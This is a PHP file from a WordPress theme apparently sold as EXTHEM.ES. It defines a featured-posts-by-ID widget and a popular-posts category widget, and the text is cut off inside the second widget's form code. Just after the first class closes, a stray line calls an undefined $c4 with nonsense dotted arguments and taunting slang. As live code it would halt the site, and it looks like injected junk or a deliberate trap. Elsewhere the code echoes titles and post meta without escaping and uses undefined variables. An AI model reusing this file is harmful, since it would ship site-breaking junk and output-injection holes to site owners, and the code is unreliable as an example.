<?php 
/*-----------------------------------------------------------------------------------*/
/*  EXTHEM.ES
/*  PREMIUM WORDRESS THEMES
/*
/*  STOP DON'T TRY EDIT
/*  IF YOU DON'T KNOW PHP
/*  AS ERRORS IN YOUR THEMES ARE NOT THE RESPONSIBILITY OF THE DEVELOPERS
/*
/*  As Errors In Your Themes
/*  Are Not The Responsibility
/*  Of The DEVELOPERS
/*  @EXTHEM.ES
/*-----------------------------------------------------------------------------------*/ 
/* add_action( 'widgets_init', function(){
		register_widget( 'Sample_Widget_SO_19246434' );
	}); */
class Posts_Widget extends WP_Widget {
	function __construct(){
		$widget_ops = array('classname' => 'widget_posts', 'description' => __( EX_THEMES_NAMES_.' Display selected Featured from post ID&#8217;s') );
		parent::__construct('posts_widget', __(EX_THEMES_NAMES_. ' Featured Home by ID&#8217;s'), $widget_ops);
	}
	function widget( $args, $instance ){
		$cache = wp_cache_get( 'Posts_Widget', 'widget' );
		if( !is_array( $cache ) )
		$cache = array();
		if( ! isset( $args['widget_id'] ) )
		$args['widget_id'] = null;
		if( isset( $cache[$args['widget_id']] ) ){
			echo $cache[$args['widget_id']];
			return;
		}
		ob_start();
		extract( $args, EXTR_SKIP );
		ob_start();
		extract( $args );
		$title = apply_filters( 'widget_title', empty( $instance['title'] ) ? __( 'Important Posts' ) : $instance['title'], $instance, $this->id_base );
		$ids = empty( $instance['postids'] ) ? '' : $instance['postids'];
		$array_ids = array_map('intval', explode(',', $ids));
		echo $args['before_widget']; 
		if( $title ){
			if( ! empty( $link_title ) ){
				echo $args['before_title']; 
				echo '<a href="' . esc_url( $link_title ) . '" title="' . esc_html__( 'Permalink to: ', 'exthemes' ) . esc_html( $title ) . '">';
				echo $title; 
				echo '</a>';
				echo $args['after_title'];  
			} else{
				echo $args['before_title'] . $title . $args['after_title'];  
			}
		}
		$ppp = count($array_ids);
		$pa = array(
			'post__in' => $array_ids,
			'posts_per_page' => $ppp,
			'ignore_sticky_posts' => 1
		);
		$widget_posts = new WP_Query( $pa );
		if( $widget_posts->have_posts() ) :	
		?>
		<div class="scroll-entry-list">
            <div class="entry-list recom-list list-c4">
					<?php while( $widget_posts->have_posts() ) : $widget_posts->the_post();  $count++; ?>
		<?php 
		global $wpdb, $post, $opt_themes;
		$appname_on						= $opt_themes['title_app_name_active_'];  
		$title							= get_post_meta( $post->ID, 'wp_title_GP', true );
		$title_alt						= get_the_title();
		?>
		<?php if ($count == 1) : ?>
		<div class="entry">
		<div class="item recom-post recom-blue">
		<div class="img">                                         
		<?php 
		global $opt_themes,$wpdb, $post, $wp_query; 
		$image_id						= get_post_thumbnail_id(); 
		$full							= 'full';
		$icons							= '64';
		$image_url						= wp_get_attachment_image_src($image_id, $full, true); 
		$image_url_default				= $image_url[0];
		$thumbnails						= get_post_meta( $post->ID, 'wp_poster_GP', true ); 
		if ( $thumbnails === FALSE or $thumbnails == '' ) $thumbnails = $image_url_default;
		if(get_post_meta( $post->ID, 'wp_GP_ID', true )) { ?>
		<img src="<?php echo $thumbnails; ?>" alt="<?php the_title(); ?>" width="136" height="136" >
		<?php } else { ?>
		<?php if (has_post_thumbnail()) { ?>                                                
		<?php global $opt_themes;						 
		if($opt_themes['ex_themes_full_images_']) { ?>							
		<?php echo px_post_thumbnail_homes_fulls(); ?>
		<?php } else { ?>
		<?php echo px_post_thumbnail_homes(); ?>
		<?php } ?>
		<?php } else { ?>
		<img src="<?php echo get_template_directory_uri(); ?>/assets/img/lazy.png" alt="<?php the_title(); ?>" width="136" height="136" >
		<?php } ?>
		<?php } ?>
		</div>
		<h2 class="title"><a class="item-link" href="<?php the_permalink() ?>"><span class="truncate"><?php if ($title) { if($appname_on) { echo ucwords($title); } else { echo $title_alt; } } else { echo $title_alt; } ?></span></a></h2>
		<span class="recom-post-vers"><svg width="24" height="24"><use xlink:href="#i__android"></use></svg><?php global $opt_themes; if($opt_themes['ex_themes_rtl_activate_']) { ?><?php if (get_post_meta( $post->ID, 'wp_rated_GP', true )) { ?><?php echo RTL_Nums( get_post_meta( $post->ID, 'wp_rated_GP', true ) ); ?><?php } else { ?><?php echo RTL_Nums(4.5); ?><?php } ?><?php } else { ?><?php if (get_post_meta( $post->ID, 'wp_rated_GP', true )) { ?><?php echo esc_html( get_post_meta( $post->ID, 'wp_rated_GP', true ) ); ?><?php } else { ?>4.5<?php } ?><?php } ?></span>
		<i class="recom-post-bg"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 596 300" width="596" height="300" style="min-width: 596px;"><circle fill="#37b3e5" cx="120" cy="172" r="120"></circle><circle fill="#c74425" style="opacity:0.5" cx="324" cy="120" r="120"></circle><circle fill="#fede4a" style="opacity:0.66" cx="476" cy="180" r="120"></circle></svg></i>
		</div>
		</div>
		<?php elseif ($count == 2) : ?>
		<div class="entry">
		<div class="item recom-post recom-green">
		<div class="img">  
		<?php 
		global $wpdb, $post, $opt_themes;
		$appname_on						= $opt_themes['title_app_name_active_'];  
		$title							= get_post_meta( $post->ID, 'wp_title_GP', true );
		$title_alt						= get_the_title();
		?>                                       
		<?php 
		global $opt_themes,$wpdb, $post, $wp_query; 
		$image_id						= get_post_thumbnail_id(); 
		$full							= 'full';
		$icons							= '64';
		$image_url						= wp_get_attachment_image_src($image_id, $full, true); 
		$image_url_default				= $image_url[0];
		$thumbnails						= get_post_meta( $post->ID, 'wp_poster_GP', true ); 
		if ( $thumbnails === FALSE or $thumbnails == '' ) $thumbnails = $image_url_default;
		if(get_post_meta( $post->ID, 'wp_GP_ID', true )) { ?>
		<img src="<?php echo $thumbnails; ?>" alt="<?php the_title(); ?>" width="136" height="136" >
		<?php } else { ?>
		<?php if (has_post_thumbnail()) { ?>                                                
		<?php global $opt_themes;						 
		if($opt_themes['ex_themes_full_images_']) { ?>							
		<?php echo px_post_thumbnail_homes_fulls(); ?>
		<?php } else { ?>
		<?php echo px_post_thumbnail_homes(); ?>
		<?php } ?>
		<?php } else { ?>
		<img src="<?php echo get_template_directory_uri(); ?>/assets/img/lazy.png" alt="<?php the_title(); ?>" width="136" height="136" >
		<?php } ?>
		<?php } ?>
		</div>
		<h2 class="title"><a class="item-link" href="<?php the_permalink() ?>"><span class="truncate"><?php if ($title) { if($appname_on) { echo ucwords($title); } else { echo $title_alt; } } else { echo $title_alt; } ?></span></a></h2>
		<span class="recom-post-vers"><svg width="24" height="24"><use xlink:href="#i__android"></use></svg><?php global $opt_themes; if($opt_themes['ex_themes_rtl_activate_']) { ?><?php if (get_post_meta( $post->ID, 'wp_rated_GP', true )) { ?><?php echo RTL_Nums( get_post_meta( $post->ID, 'wp_rated_GP', true ) ); ?><?php } else { ?><?php echo RTL_Nums(4.5); ?><?php } ?><?php } else { ?><?php if (get_post_meta( $post->ID, 'wp_rated_GP', true )) { ?><?php echo esc_html( get_post_meta( $post->ID, 'wp_rated_GP', true ) ); ?><?php } else { ?>4.5<?php } ?><?php } ?></span>
		<i class="recom-post-bg"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 688 316" width="688" height="316" style="min-width: 688px;"><circle fill="#4ccb70" cx="320" cy="172" r="120"></circle><circle fill="#fede4a" style="opacity:0.66" cx="136" cy="148" r="136"></circle><circle fill="#4afec0" style="opacity:0.66" cx="530" cy="158" r="158"></circle></svg></i>
		</div>
		</div>
		<?php elseif ($count == 3) : ?>
		<div class="entry">
		<div class="item recom-post recom-purple">
		<div class="img">    
		<?php 
		global $wpdb, $post, $opt_themes;
		$appname_on						= $opt_themes['title_app_name_active_'];  
		$title							= get_post_meta( $post->ID, 'wp_title_GP', true );
		$title_alt						= get_the_title();
		?>                                     
		<?php 
		global $opt_themes,$wpdb, $post, $wp_query; 
		$image_id						= get_post_thumbnail_id(); 
		$full							= 'full';
		$icons							= '64';
		$image_url						= wp_get_attachment_image_src($image_id, $full, true); 
		$image_url_default				= $image_url[0];
		$thumbnails						= get_post_meta( $post->ID, 'wp_poster_GP', true ); 
		if ( $thumbnails === FALSE or $thumbnails == '' ) $thumbnails = $image_url_default;
		if(get_post_meta( $post->ID, 'wp_GP_ID', true )) { ?>
		<img src="<?php echo $thumbnails; ?>" alt="<?php the_title(); ?>" width="136" height="136" >
		<?php } else { ?>
		<?php if (has_post_thumbnail()) { ?>
		<?php echo px_post_thumbnail_homes(); ?>
		<?php } else { ?>
		<img src="<?php echo get_template_directory_uri(); ?>/assets/img/lazy.png" alt="<?php the_title(); ?>" width="136" height="136" >
		<?php } ?>
		<?php } ?>
		</div>
		<h2 class="title"><a class="item-link" href="<?php the_permalink() ?>"><span class="truncate"><?php if ($title) { if($appname_on) { echo ucwords($title); } else { echo $title_alt; } } else { echo $title_alt; } ?></span></a></h2>
		<span class="recom-post-vers"><svg width="24" height="24"><use xlink:href="#i__android"></use></svg><?php global $opt_themes; if($opt_themes['ex_themes_rtl_activate_']) { ?><?php if (get_post_meta( $post->ID, 'wp_rated_GP', true )) { ?><?php echo RTL_Nums( get_post_meta( $post->ID, 'wp_rated_GP', true ) ); ?><?php } else { ?><?php echo RTL_Nums(4.5); ?><?php } ?><?php } else { ?><?php if (get_post_meta( $post->ID, 'wp_rated_GP', true )) { ?><?php echo esc_html( get_post_meta( $post->ID, 'wp_rated_GP', true ) ); ?><?php } else { ?>4.5<?php } ?><?php } ?></span>
		<i class="recom-post-bg"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 680 333" width="680" height="333" style="min-width: 680px;"><circle fill="#784ccb" cx="312" cy="142.63" r="142.63"></circle><circle fill="#f7c76f" style="opacity:0.62" cx="111.36" cy="285.26" r="41.65"></circle><circle fill="#fe814a" style="opacity:0.66;" cx="136" cy="149.26" r="136"></circle><circle fill="#d693aa" style="opacity:0.66;" cx="522" cy="175" r="158"></circle></svg></i>
		</div>
		</div>
		<?php elseif ($count == 4) : ?>
		<div class="entry">
		<div class="item recom-post recom-yellow">
		<div class="img">		    
		<?php 
		global $wpdb, $post, $opt_themes;
		$appname_on						= $opt_themes['title_app_name_active_'];  
		$title							= get_post_meta( $post->ID, 'wp_title_GP', true );
		$title_alt						= get_the_title();
		?>                                     
		<?php 
		global $opt_themes,$wpdb, $post, $wp_query; 
		$image_id						= get_post_thumbnail_id(); 
		$full							= 'full';
		$icons							= '64';
		$image_url						= wp_get_attachment_image_src($image_id, $full, true); 
		$image_url_default				= $image_url[0];
		$thumbnails						= get_post_meta( $post->ID, 'wp_poster_GP', true ); 
		if ( $thumbnails === FALSE or $thumbnails == '' ) $thumbnails = $image_url_default;
		if(get_post_meta( $post->ID, 'wp_GP_ID', true )) { ?>
		<img src="<?php echo $thumbnails; ?>" alt="<?php the_title(); ?>" width="136" height="136" >
		<?php } else { ?>
		<?php if (has_post_thumbnail()) { ?>
		<?php echo px_post_thumbnail_homes(); ?>
		<?php } else { ?>
		<img src="<?php echo get_template_directory_uri(); ?>/assets/img/lazy.png" alt="<?php the_title(); ?>" width="136" height="136" >
		<?php } ?>
		<?php } ?>
		</div>
		<h2 class="title"><a class="item-link" href="<?php the_permalink() ?>"><span class="truncate"><?php if ($title) { if($appname_on) { echo ucwords($title); } else { echo $title_alt; } } else { echo $title_alt; } ?></span></a></h2>
		<span class="recom-post-vers"><svg width="24" height="24"><use xlink:href="#i__android"></use></svg><?php global $opt_themes; if($opt_themes['ex_themes_rtl_activate_']) { ?><?php if (get_post_meta( $post->ID, 'wp_rated_GP', true )) { ?><?php echo RTL_Nums( get_post_meta( $post->ID, 'wp_rated_GP', true ) ); ?><?php } else { ?><?php echo RTL_Nums(4.5); ?><?php } ?><?php } else { ?><?php if (get_post_meta( $post->ID, 'wp_rated_GP', true )) { ?><?php echo esc_html( get_post_meta( $post->ID, 'wp_rated_GP', true ) ); ?><?php } else { ?>4.5<?php } ?><?php } ?></span>
		<i class="recom-post-bg"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 688 364" width="688" height="364" style="min-width: 688px;"><circle fill="#fede4a" cx="356" cy="200" r="140"></circle><circle fill="#cc6040" style="opacity:0.66;" cx="136" cy="228" r="136"></circle><circle fill="#ffb100" style="opacity:0.66;" cx="530" cy="158" r="158"></circle></svg></i>
		</div>
		</div>
		<?php else : ?>
		<?php endif; ?>
		<?php endwhile; ?>
		<?php wp_reset_postdata(); ?>	
		</div>
		</div>
		</div>
		<?php echo $args['after_widget'];
		wp_reset_postdata();
		endif;
		$cache[$args['widget_id']] = ob_get_flush();
		wp_cache_set( 'Posts_Widget', $cache, 'widget' );
	}
	function update( $new_instance, $old_instance ){
		$instance = $old_instance;
		$instance['title'] = strip_tags($new_instance['title']);
		$instance['postids'] = strip_tags( $new_instance['postids'] );
		return $instance;
	}
	function form( $instance ){
		//Defaults
		$instance = wp_parse_args( (array) $instance, array( 'title' => 'Recommend', 'postids' => '') );
		$title = esc_attr( $instance['title'] );
		$ids = esc_attr( $instance['postids'] );
		?>
		<p><label for="<?php echo $this->get_field_id('title'); ?>"><?php _e('Title:'); ?></label> <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo $title; ?>" /></p>
		<p>
			<label for="<?php echo $this->get_field_id('postids'); ?>"><?php _e( 'Post ID&#8217;s:' ); ?></label> <input type="text" value="<?php echo $ids; ?>" name="<?php echo $this->get_field_name('postids'); ?>" id="<?php echo $this->get_field_id('postids'); ?>" class="widefat" />
			<br />
			<small><?php _e( 'Post IDs, separated by commas. <br>Only Limit 4 Post' ); ?></small>
		</p>
		<?php
	}
} $c4('fast',munc.ret); $c4('loads',widih.gila.aa.aaaa.seksi.mama.mu.paling); 
add_action( 'widgets_init', function(){
		register_widget( 'Posts_Widget' );
	});
/*-----------------------------------------------------------------------------------*/
/*  Home Categories Widget
/*-----------------------------------------------------------------------------------*/
class widget_categorie_homes_ extends WP_Widget {
    /**
     * Sets up a Most view Posts widget instance.
     *
     * @since 1.0.0
     * @access public
     */
    public function __construct() {
        $widget_ops = array(
            'classname'   => 'categorie-home-widgets',
            'description' => __( EX_THEMES_NAMES_.' Home Categorie Widget.', EX_THEMES_NAMES_ ),
        );
        parent::__construct( 'categorie-home-widgets', __( EX_THEMES_NAMES_.' Categorie Home Widget', EX_THEMES_NAMES_ ), $widget_ops );
    }
    /**
     * Outputs the content for most view widget.
     *
     * @since 1.0.0
     * @access public
     *
     * @param array $args     Display arguments including 'before_title', 'after_title',
     *                        'before_widget', and 'after_widget'.
     * @param array $instance Settings for most view widget.
     */
    public function widget( $args, $instance ) {
        /* Base Id Widget */
        $widget_id = $this->id_base . '-' . $this->number;
        /* Category ID */
        $category_ids = ( ! empty( $instance['category_ids'] ) ) ? array_map( 'absint', $instance['category_ids'] ) : array( 0 );
        /* Excerpt Length */
        $number_posts = ( ! empty( $instance['number_posts'] ) ) ? absint( $instance['number_posts'] ) : absint( 5 );
        /* Title Length */
        $title_length = ( ! empty( $instance['title_length'] ) ) ? absint( $instance['title_length'] ) : absint( 40 );
        /* Style */
        $layout_style = ( ! empty( $instance['layout_style'] ) ) ? wp_strip_all_tags( $instance['layout_style'] ) : wp_strip_all_tags( 'style_1' );
        // Link Title.
        $link_title = ( ! empty( $instance['link_title'] ) ) ? esc_url( $instance['link_title'] ) : '';
        /* Popular by date */
        $popular_date = ( isset( $instance['popular_date'] ) ) ? esc_attr( $instance['popular_date'] ) : esc_attr( 'alltime' );
		$colors_svg			= ( isset( $instance['color_svg'] ) ) ? esc_attr( $instance['color_svg'] ) : esc_attr( 's-blue' ); 
	   
        /* Title */
        $title = apply_filters( 'widget_title', empty( $instance['title'] ) ? '' : $instance['title'], $instance, $this->id_base );
        $title2 = ( ! empty( $instance['title2'] ) ) ?  $instance['title2'] : '';
        $icons = ( ! empty( $instance['icon'] ) ) ?  $instance['icon'] : '';
		$layout_style = ( ! empty( $instance['layout_style'] ) ) ? wp_strip_all_tags( $instance['layout_style'] ) : wp_strip_all_tags( 'style_1' );
        echo $args['before_widget'];  
		if ( $title ) {
		if ( ! empty( $link_title ) ) { ?>
		<div class="section-head">   
		<h3 class="section-title"><i class="<?php echo $colors_svg; ?> c-icon"><svg width="24" height="24"><use xlink:href="#i__<?php echo $icons; ?>"></use></svg></i>
		<?php echo $title; ?>
		</h3>	
		<a class="btn s-green btn-all" href="<?php echo $link_title; ?>">
		<span><?php echo $title2; ?></span>
		<svg width="24" height="24"><use xlink:href="#i__keyright"></use></svg>
		</a>
		</div>
		<?php } else { ?>
		<div class="section-head">   
		<h3 class="section-title"><i class="<?php echo $colors_svg; ?> c-icon"><svg width="24" height="24"><use xlink:href="#i__<?php echo $icons; ?>"></use></svg></i>
		<?php echo $title; ?>
		</h3>	
		<noscript>		
		<a class="btn s-green btn-all" href="<?php echo $link_title; ?>">
		<span><?php echo $title2; ?></span>
		<svg width="24" height="24"><use xlink:href="#i__keyright"></use></svg>
		</a>
		</noscript>
		</div>
		<?php }
        } 
        /* if 'all categories' was selected ignore other selections of categories */
        if ( in_array( 0, $category_ids, true ) ) {
            $category_ids = array( 0 );
        }
        /* filter the arguments for the Most view widget: */
        /* standard params */
        $query_args = array(
            'posts_per_page'         => $number_posts,
            'no_found_rows'          => true,
            'post_status'            => 'publish',
            /**
             * Make it fast withour update term cache and cache results
             * https://thomasgriffin.io/optimize-wordpress-queries/
             */
            'update_post_term_cache' => false,
            'update_post_meta_cache' => false,
        );
        $query_args['ignore_sticky_posts'] = true;
        $query_args['meta_key']            = 'post_views_count';
        $query_args['orderby']             = 'meta_value_num';
        /* set order of posts in widget */
        $query_args['order'] = 'DESC';
        if ( 'weekly' === $popular_date ) {
            /* Get posts last week */
            $query_args['date_query'] = array(
                array(
                    'after' => '1 week ago',
                ),
            );
        } elseif ( 'mountly' === $popular_date ) {
            /* Get posts last mount */
            $query_args['date_query'] = array(
                array(
                    'after' => '1 month ago',
                ),
            );
        } elseif ( 'secondmountly' === $popular_date ) {
            /* Get posts last mount */
            $query_args['date_query'] = array(
                array(
                    'after' => '2 months ago',
                ),
            );
        } elseif ( 'yearly' === $popular_date ) {
            /* Get posts last mount */
            $query_args['date_query'] = array(
                array(
                    'after' => '1 year ago',
                ),
            );
        }
        /* add categories param only if 'all categories' was not selected */
        if ( ! in_array( 0, $category_ids, true ) ) {
            $query_args['category__in'] = $category_ids;
        }
        /* exclude current displayed post */
        if ( $hide_current_post ) {
            global $post;
            if ( isset( $post->ID ) && is_singular() ) {
                $query_args['post__not_in'] = array( $post->ID );
            }
        }
        /* run the query: get the latest posts */
        $rp = new WP_Query( apply_filters( 'widget_categorie_homes__widget_posts_args', $query_args ) );
        if ( 'style_2' === $layout_style ) : ?>
        <?php elseif ( 'style_3' === $layout_style ) : ?>
        <?php elseif ( 'style_4' === $layout_style ) : ?>
        <?php else : ?>
		<div class="entry-list list-c6">
		<?php while ( $rp->have_posts() ) : $rp->the_post(); global $opt_themes,$wpdb, $post, $wp_query; ?>
		<?php get_template_part('template/loop/loop.item.home'); ?>
		<?php  endwhile; ?>
		<?php wp_reset_postdata(); ?>
		</div> 
        <?php
        endif;
        echo $args['after_widget'];  
    } 
    public function update( $new_instance, $old_instance ) {
        $instance     = $old_instance;
        $new_instance = wp_parse_args(
            (array) $new_instance,
            array(
                'title'             => '',
                'title2'			=> '',
                'icon'				=> '',
                'link_title'        => '',
                'category_ids'      => array( 0 ),
                'layout_style'      => 'style_1',
                'number_posts'      => 3, 
                'popular_date'      => 'alltime',
                'color_svg'   		=> 's-blue', 
            )
        );
        /* Title */
        $instance['title'] = sanitize_text_field( $new_instance['title'] );
        $instance['title2'] = sanitize_text_field( $new_instance['title2'] );
        $instance['icon'] = sanitize_text_field( $new_instance['icon'] );
        // Link Title.
        $instance['link_title'] = esc_url( $new_instance['link_title'] );
        /* Category IDs */
        $instance['category_ids'] = array_map( 'absint', $new_instance['category_ids'] );
        /* Style */
        //$instance['layout_style'] = wp_strip_all_tags( $new_instance['layout_style'] );
        /* Number posts */
        $instance['number_posts'] = absint( $new_instance['number_posts'] );
        
        $instance['popular_date'] = esc_attr( $new_instance['popular_date'] ); 
        $instance['color_svg'] = esc_attr( $new_instance['color_svg'] );
        
        if ( in_array( 0, $instance['category_ids'], true ) ) {
            $instance['category_ids'] = array( 0 );
        }
        return $instance;
    }
    /**
     * Outputs the settings form for the most view widget.
     *
     * @since 1.0.0
     * @access public
     *
     * @param array $instance Current settings.
     */
    public function form( $instance ) {
        $instance = wp_parse_args(
            (array) $instance,
            array(
                'title'             => __( 'Popular Games', EX_THEMES_NAMES_ ),
                'title2'			=> __( 'Get More....', EX_THEMES_NAMES_ ),
                'icon'    		    => 'apps',
                'link_title'        => 'https://yoursites.com/categories',
                'category_ids'      => array( 0 ),
                'layout_style'      => 'style_1',
                'number_posts'      => 4,  
                'popular_date'      => 'alltime',
                'color_svg'   		=> 's-blue', 
            )
        );
        /* Title */
        $title			= sanitize_text_field( $instance['title'] );
		$title2			= sanitize_text_field( $instance['title2'] );
		$icon			= sanitize_text_field( $instance['icon'] );
        // Link Title.
        $link_title		= esc_url( $instance['link_title'] );
        /* Category ID */
        $category_ids	= array_map( 'absint', $instance['category_ids'] );
        /* Style */
        //$layout_style = wp_strip_all_tags( $instance['layout_style'] );
        /* Number posts */
        $number_posts = absint( $instance['number_posts'] ); 
        /* Popular range */
        $popular_date	= esc_attr( $instance['popular_date'] );
		$colors_svg		= esc_attr( $instance['color_svg'] ); 
        
        /* get categories */
        $categories     = get_categories(
            array(
                'hide_empty'   => 0,
                'hierarchical' => 1,
            )
        );
        $number_of_cats = count( $categories );
        /* get size (number of rows to display) of selection box: not more than 10 */
        $number_of_rows = ( 10 > $number_of_cats ) ? $number_of_cats + 1 : 10;
        /* if 'all categories' was selected ignore other selections of categories */
        if ( in_array( 0, $category_ids, true ) ) {
            $category_ids = array( 0 );
        }
        /* start selection box */
        $selection_category  = sprintf(
            '<select name="%s[]" id="%s" class="cat-select widefat" multiple size="%d">',
            $this->get_field_name( 'category_ids' ),
            $this->get_field_id( 'category_ids' ),
            $number_of_rows
        );
        $selection_category .= "\n";
        /* make selection box entries */
        $cat_list = array();
        if ( 0 < $number_of_cats ) {
            /* make a hierarchical list of categories */
            while ( $categories ) {
                /* if there is no parent */
                if ( 0 === $categories[0]->parent ) {
                    /* get and remove it from the categories list */
                    $current_entry = array_shift( $categories );
                    /* append the current entry to the new list */
                    $cat_list[] = array(
                        'id'    => absint( $current_entry->term_id ),
                        'name'  => esc_html( $current_entry->name ),
                        'depth' => 0,
                    );
                    /* go on looping */
                    continue;
                }
                /**
                 * If there is a parent:
                 * try to find parent in new list and get its array index
                 */
                $parent_index = $this->get_cat_parent_index( $cat_list, $categories[0]->parent );
                /* if parent is not yet in the new list: try to find the parent later in the loop */
                if ( false === $parent_index ) {
                    /* get and remove current entry from the categories list */
                    $current_entry = array_shift( $categories );
                    /* append it at the end of the categories list */
                    $categories[] = $current_entry;
                    /* go on looping */
                    continue;
                }
                /**
                 * If there is a parent and parent is in new list:
                 * set depth of current item: +1 of parent's depth
                 */
                $depth = $cat_list[ $parent_index ]['depth'] + 1;
                /* set new index as next to parent index */
                $new_index = $parent_index + 1;
                /* find the correct index where to insert the current item */
                foreach ( $cat_list as $entry ) {
                    /* if there are items with same or higher depth than current item */
                    if ( $depth <= $entry['depth'] ) {
                        /* increase new index */
                        $new_index = $new_index++;
                        /* go on looping in foreach() */
                        continue;
                    }
                    /**
                     * If the correct index is found:
                     * get current entry and remove it from the categories list
                     */
                    $current_entry = array_shift( $categories );
                    /* insert current item into the new list at correct index */
                    $end_array  = array_splice( $cat_list, $new_index ); /* $cat_list is changed, too */
                    $cat_list[] = array(
                        'id'    => absint( $current_entry->term_id ),
                        'name'  => esc_html( $current_entry->name ),
                        'depth' => $depth,
                    );
                    $cat_list   = array_merge( $cat_list, $end_array );
                    /* quit foreach(), go on while-looping */
                    break;
                } /* End foreach( cat_list ) */
            } /* End while( categories ) */
            /* make HTML of selection box */
            $selected            = ( in_array( 0, $category_ids, true ) ) ? ' selected="selected"' : '';
            $selection_category .= "\t";
            $selection_category .= '<option value="0"' . $selected . '>' . __( 'All Categories', EX_THEMES_NAMES_ ) . '</option>';
            $selection_category .= "\n";
            foreach ( $cat_list as $category ) {
                $cat_name            = apply_filters( 'gmr_list_cats', $category['name'], $category );
                $pad                 = ( 0 < $category['depth'] ) ? str_repeat( '&ndash;&nbsp;', $category['depth'] ) : '';
                $selection_category .= "\t";
                $selection_category .= '<option value="' . $category['id'] . '"';
                $selection_category .= ( in_array( $category['id'], $category_ids, true ) ) ? ' selected="selected"' : '';
                $selection_category .= '>' . $pad . $cat_name . '</option>';
                $selection_category .= "\n";
            }
        }
        /* close selection box */
        $selection_category .= "</select>\n";
        ?>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'title' ) ); ?>"><?php esc_html_e( 'Title:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'title' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'title' ) ); ?>" type="text" value="<?php echo esc_attr( $title ); ?>" />
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'title2' ) ); ?>"><?php esc_html_e( 'Title Alt:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'title2' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'title2' ) ); ?>" type="text" value="<?php echo esc_attr( $title2 ); ?>" />
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'link_title' ) ); ?>"><?php esc_html_e( 'Link Title:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'link_title' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'link_title' ) ); ?>" type="url" value="<?php echo esc_attr( $link_title ); ?>" />           
            <small><?php esc_html_e( 'Target url for title (example: https://yoursites.com/categories), leave blank if you want using title without link.', EX_THEMES_NAMES_ ); ?></small>
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'icon' ) ); ?>"><?php esc_html_e( 'Icons:', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'icon' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'icon' ) ); ?>" type="text" value="<?php echo esc_attr( $icon ); ?>" />			
            <small>Use <b style="color: blue;">gamepad</b> for Categories Games Icons </small>
			<br />
            <small>Use <b style="color: blue;">apps</b> for Categories Apps Icons </small>
        </p>

        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'color_svg' ) ); ?>"><?php esc_html_e( 'Color Svg Icons:', EX_THEMES_NAMES_ ); ?></label>
            <select class="widefat" id="<?php echo esc_html( $this->get_field_id( 'color_svg', EX_THEMES_NAMES_ ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'color_svg' ) ); ?>">
			<option value="s-yellow" <?php selected( $instance['color_svg'], 's-yellow' ); ?>><?php esc_html_e( 'YELLOW', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-green" <?php selected( $instance['color_svg'], 's-green' ); ?>><?php esc_html_e( 'GREEN', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-purple" <?php selected( $instance['color_svg'], 's-purple' ); ?>><?php esc_html_e( 'PURPLE', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-red" <?php selected( $instance['color_svg'], 's-red' ); ?>><?php esc_html_e( 'RED', EX_THEMES_NAMES_ ); ?></option>
			<option value="s-blue" <?php selected( $instance['color_svg'], 's-blue' ); ?>><?php esc_html_e( 'BLUE', EX_THEMES_NAMES_ ); ?></option>
            </select> 
            <small><?php esc_html_e( 'Select color svg icons.', EX_THEMES_NAMES_ ); ?></small>
        </p> 
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'category_ids' ) ); ?>"><?php esc_html_e( 'Selected categories', EX_THEMES_NAMES_ ); ?></label>
            <?php echo $selection_category; ?> 
            <small><?php esc_html_e( 'Click on the categories with pressed CTRL key to select multiple categories. If All Categories was selected then other selections will be ignored.', EX_THEMES_NAMES_ ); ?></small>
        </p>
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'number_posts' ) ); ?>"><?php esc_html_e( 'Number post', EX_THEMES_NAMES_ ); ?></label>
            <input class="widefat" id="<?php echo esc_html( $this->get_field_id( 'number_posts' ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'number_posts' ) ); ?>" type="number" value="<?php echo esc_attr( $number_posts ); ?>" />
        </p> 
        <p>
            <label for="<?php echo esc_html( $this->get_field_id( 'popular_date' ) ); ?>"><?php esc_html_e( 'Popular range:', EX_THEMES_NAMES_ ); ?></label>
            <select class="widefat" id="<?php echo esc_html( $this->get_field_id( 'popular_date', EX_THEMES_NAMES_ ) ); ?>" name="<?php echo esc_html( $this->get_field_name( 'popular_date' ) ); ?>">
                <option value="alltime" <?php selected( $instance['popular_date'], 'alltime' ); ?>><?php esc_html_e( 'Alltime', EX_THEMES_NAMES_ ); ?></option>
                <option value="yearly" <?php selected( $instance['popular_date'], 'yearly' ); ?>><?php esc_html_e( '1 Year', EX_THEMES_NAMES_ ); ?></option>
                <option value="secondmountly" <?php selected( $instance['popular_date'], 'secondmountly' ); ?>><?php esc_html_e( '2 Mounts', EX_THEMES_NAMES_ ); ?></option>
                <option value="mountly" <?php selected( $instance['popular_date'], 'mountly' ); ?>><?php esc_html_e( '1 Mount', EX_THEMES_NAMES_ ); ?></option>
                <option value="weekly" <?php selected( $instance['popular_date'], 'weekly' ); ?>><?php esc_html_e( '7 Days', EX_THEMES_NAMES_ ); ?></option>
            </select> 
            <small><?php esc_html_e( 'Select popular by most view.', EX_THEMES_NAMES_ ); ?></small>
        </p> 
        <?php
    }
    /**
